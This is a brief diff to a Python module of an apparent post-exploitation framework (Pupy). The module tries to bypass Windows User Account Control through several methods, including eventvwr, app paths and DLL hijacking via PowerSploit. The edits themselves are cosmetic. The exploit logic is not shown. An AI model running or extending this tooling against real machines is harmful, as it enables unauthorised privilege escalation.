@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 #Author: @bobsecq
 #Contributor(s):
 
@@ -13,7 +13,7 @@ ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 @config(compat="windows", category="privesc")
 class BypassUAC(PupyModule):
     """try to bypass UAC """
-    dependencies=["pupwinutils.processes", "pupwinutils.security"]
+    dependencies=['pupwinutils.processes', 'pupwinutils.security', 'powershell']
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
@@ -36,11 +36,11 @@ class BypassUAC(PupyModule):
                 appPathsMethod = True
             else:
                 dllhijackingMethod = True
-        elif args.method == "appPaths":     
+        elif args.method == "appPaths":
             appPathsMethod = True
-        elif args.method == "eventvwr":     
+        elif args.method == "eventvwr":
             eventvwrMethod = True
-        elif args.method == "dll_hijacking":     
+        elif args.method == "dll_hijacking":
             dllhijackingMethod = True
 
         if appPathsMethod:
@@ -53,4 +53,3 @@ class BypassUAC(PupyModule):
             # Invoke-BypassUAC.ps1 uses different technics to bypass depending on the Windows Version (Sysprep for Windows 7/2008 and NTWDBLIB.dll for Windows 8/2012)
             self.success("Trying to bypass UAC using DLL Hijacking, wind7-8.1 targets...")
             bypassUasModule.bypassuac_through_powerSploitBypassUAC()
-
